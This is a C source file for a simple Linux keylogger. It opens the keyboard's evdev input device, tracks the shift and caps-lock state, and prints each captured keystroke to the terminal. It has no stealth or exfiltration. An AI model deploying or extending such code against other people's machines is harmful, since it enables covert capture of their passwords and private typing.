#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/input.h>
#include "resolve_key.h"
#include "keyboard_finder.h"
int main() {

    char *kbd_path = find_keyboard_path();
    if (kbd_path) {
        printf("Keyboard found: %s\n", kbd_path);
       
    } else {
        fprintf(stderr, "No keyboard found (check root or 'input' group permissions).\n");
        return 1;
    }
    printf("Keylogger started\n");
    int fd = open(kbd_path, O_RDONLY , 0);
    if (fd == -1) {
        perror("Error opening file");
        exit(EXIT_FAILURE);
    }


    struct input_event ie;
    bool left_shift = false, right_shift = false, caps = false;

    while (1) {

        read(fd, &ie, sizeof(ie));
        if (ie.type != EV_KEY)
            continue;

        // Track modifier state on both press (1), autorepeat (2) and release (0)
        if (ie.code == KEY_LEFTSHIFT)
            left_shift = (ie.value != 0);
        else if (ie.code == KEY_RIGHTSHIFT)
            right_shift = (ie.value != 0);
        else if (ie.code == KEY_CAPSLOCK && ie.value == 1)
            caps = !caps;


        if (ie.value != 1 && ie.value != 2)
            continue;
        
            
        if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT ||
            ie.code == KEY_CAPSLOCK)
            continue;    


        bool shift = left_shift || right_shift;
        char c = resolve_key(ie.code, shift, caps);
        if (c) {
            fputc(c, stdout);
        } else {
            const char *name = special_key_name(ie.code);
            if (name)
                fputs(name, stdout);
        }
        fflush(stdout);            

    }
   free(kbd_path);

}
